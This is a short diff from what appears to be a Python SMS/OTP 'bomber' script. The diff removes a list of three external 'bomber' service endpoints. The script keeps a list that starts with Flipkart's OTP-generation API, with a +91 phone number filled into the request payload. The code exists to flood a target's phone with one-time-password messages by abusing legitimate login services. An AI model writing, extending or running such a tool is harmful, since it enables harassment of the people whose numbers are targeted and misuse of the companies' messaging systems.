@@ -27,13 +27,6 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-# ====== TERI 3 RENDER APIS ======
-TERI_APIS = [
-    {"name": "felix_xbom", "url": "https://felix-xbom.onrender.com/bom", "params": {"key": "demo", "num": None}, "type": "external"},
-    {"name": "bomber_apis", "url": "https://bomber-apis.onrender.com/bom", "params": {"key": "felix", "num": None}, "type": "external"},
-    {"name": "bomber_shuvo", "url": "https://bomber-shuvo.onrender.com/bomb", "params": {"phone": None, "key": "shuvo", "cycles": 1}, "type": "external"}
-]
-
 # ====== JBOMBER.JAVA SE ======
 JBOMBER_APIS = [
     {"name": "flipkart_jb", "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", "method": "POST", "payload": {"loginId": "+91{num}", "supportAllStates": True}},
